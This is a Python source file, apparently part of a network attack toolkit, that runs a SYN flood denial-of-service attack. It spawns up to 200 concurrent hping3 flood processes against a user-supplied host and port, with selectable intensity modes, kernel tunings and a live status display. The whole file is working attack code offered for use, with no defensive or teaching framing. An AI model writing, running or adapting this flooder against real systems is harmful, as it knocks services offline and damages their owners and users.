# Note: Does not use spoofing to avoid being classified as a DDoS attack.
# Another Note: This uses "hping3" and is SYN Flood!
# Modes:
# Simple: 1 task (Light)
# Base:   50 tasks (Default)
# Turbo:  200 tasks (Intensive)
# (This applies to everyone!)
###########
# IMPORTS #
###########
from scripts.platform_utils import find_hping3, apply_kernel_tunings
from rich.console import Console
import asyncio
import subprocess
import sys
import time
import os
import threading

############
# PRE-DEFS #
############
console = Console()

############
# COUNTERS #
############
total_errors = 0
lock_counter = threading.Lock()
start_time = 0
running = True
processes = []

##################
# CONFIGURATIONS #
##################
try:
    modebort = console.input("[yellow] Do you want Simple mode (s) or Base mode (b) or Turbo mode (t)?[/yellow] ")
    modebort = modebort.strip().lower()
    if modebort in ["t", "turbo"]:
        console.print("[yellow] Okay, at your own risk.[/yellow]")
        NUM_TASKS = 200
    elif modebort in ["b", "base"]:
        console.print("[yellow] Alright, moving on with base mode.[/yellow]")
        NUM_TASKS = 50
    else:
        console.print("[yellow] Moving forward with Simple mode.[/yellow]")
        NUM_TASKS = 1
except KeyboardInterrupt:
    console.print("[red] Canceled by user.[/red]")
    sys.exit(2)
except Exception as e:
    console.print(f"[red] Error: {e}[/red]")
    sys.exit(1)

###############
# ATTACK TASK #
###############
async def syn_flood_task(host, port, hping3_path):
    global total_errors, processes
    cmd = [hping3_path, "-S", "-p", str(port), "--flood", host]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        with lock_counter:
            processes.append(proc)
        await proc.wait()
    except asyncio.CancelledError:
        return
    except Exception:
        return

###########
# DISPLAY #
###########
def update_display(host, port):
    global start_time, running
    while running:
        elapsed = time.time() - start_time
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 50)
        print("  ☠︎ SYN Flood (DoS) - hping3 ☠︎")
        print("=" * 50)
        print(f"  Host:Port     : {host}:{port}")
        print(f"  Uptime (s)    : {int(elapsed)}")
        print(f"  hping3 tasks  : {NUM_TASKS}")
        print("=" * 50)
        print("  [Press Ctrl+C to stop]")
        time.sleep(1)

########
# MAIN #
########
async def main_attack(host, port):
    global start_time, running, processes
    start_time = time.time()
    hping3_path = find_hping3()
    thread = threading.Thread(target=update_display, args=(host, port))
    thread.daemon = True
    thread.start()
    attack_tasks = [asyncio.create_task(syn_flood_task(host, port, hping3_path)) for _ in range(NUM_TASKS)]
    try:
        await asyncio.gather(*attack_tasks)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting immediately...")
        running = False
        with lock_counter:
            for proc in processes:
                try:
                    proc.terminate()
                except Exception:
                    pass
        thread.join(timeout=1)
        sys.exit(0)

##########
# RUNNER #
##########
def run(host, port):
    apply_kernel_tunings()
    print(f"[DEBUG] SYN Flood attack started for {host}:{port} (hping3)")
    apply_kernel_tunings()
    try:
        asyncio.run(main_attack(host, port))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)